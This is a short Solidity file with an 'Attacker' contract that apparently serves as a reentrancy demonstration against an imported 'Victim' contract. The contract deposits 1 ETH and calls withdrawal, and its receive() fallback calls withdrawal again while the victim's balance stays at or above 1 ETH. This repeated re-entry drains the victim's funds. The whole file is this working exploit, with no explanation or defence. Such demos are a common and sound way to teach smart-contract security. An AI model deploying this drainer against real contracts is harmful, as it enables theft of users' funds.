pragma solidity ^0.8.0;

import "./Victim.sol";

contract Attacker {
	address public victim_address = 0x5FbDB2315678afecb367f032d93F642f64180aa3;
	Victim public victim = Victim(victim_address);

	receive() external payable {
		if (address(victim).balance >= 1 ether) {
			victim.withdrawal();
		}
	}

	function attack() external payable {
		require(msg.value >= 1 ether, "Require at least 1 ETH to attack");
		victim.deposit{value: 1 ether}();
		victim.withdrawal();
	}

	function getBalances() public view returns (uint) {
		return address(this).balance;
	}
}
